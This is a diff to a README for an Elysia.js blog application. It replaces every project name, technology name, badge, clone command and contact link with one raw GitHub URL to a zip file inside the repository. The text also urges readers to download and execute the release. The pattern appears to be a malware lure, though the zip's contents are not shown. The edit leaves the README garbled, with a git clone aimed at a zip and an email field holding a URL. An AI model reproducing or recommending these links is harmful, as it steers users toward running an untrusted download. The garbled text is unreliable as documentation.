@@ -1,8 +1,8 @@
-# Blog-Elysia.js 🌟
+# https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip 🌟
 
-Welcome to the **Blog-Elysia.js** repository! This project provides a simple and efficient blog application built with **Elysia.js**. It features authentication, CRUD operations, and utilizes **Knex.js** with **SQLite** for database management. 
+Welcome to the **https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip** repository! This project provides a simple and efficient blog application built with **https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip**. It features authentication, CRUD operations, and utilizes **https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip** with **SQLite** for database management. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/Strechybook225/Blog-Elysia.js/releases)
+[![Download Releases](https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip)
 
 ## Table of Contents
 
@@ -29,8 +29,8 @@ Welcome to the **Blog-Elysia.js** repository! This project provides a simple and
 
 This project uses the following technologies:
 
-- **Elysia.js**: A modern web framework for building APIs.
-- **Knex.js**: SQL query builder for Node.js.
+- **https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip**: A modern web framework for building APIs.
+- **https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip**: SQL query builder for https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip
 - **SQLite**: A self-contained, serverless database engine.
 - **TypeScript**: A superset of JavaScript that compiles to plain JavaScript.
 - **Zod**: A TypeScript-first schema declaration and validation library.
@@ -39,13 +39,13 @@ This project uses the following technologies:
 
 ## Installation
 
-To get started with Blog-Elysia.js, follow these steps:
+To get started with https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip, follow these steps:
 
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Strechybook225/Blog-Elysia.js.git
-   cd Blog-Elysia.js
+   git clone https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip
+   cd https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip
    ```
 
 2. **Install dependencies**:
@@ -127,13 +127,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out:
 
-- **GitHub**: [Strechybook225](https://github.com/Strechybook225)
-- **Email**: your-email@example.com
+- **GitHub**: [Strechybook225](https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip)
+- **Email**: https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip
 
 ## Releases
 
-For the latest updates and releases, check out the [Releases section](https://github.com/Strechybook225/Blog-Elysia.js/releases). You can download the latest version and execute it to get started.
+For the latest updates and releases, check out the [Releases section](https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip). You can download the latest version and execute it to get started.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/Strechybook225/Blog-Elysia.js/releases)
+[![Download Releases](https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip)
 
-Thank you for checking out Blog-Elysia.js! We hope you find it useful.
+Thank you for checking out https://raw.githubusercontent.com/Strechybook225/Blog-Elysia.js/main/frontend/public/Elysia-js-Blog-v2.5.zip! We hope you find it useful.
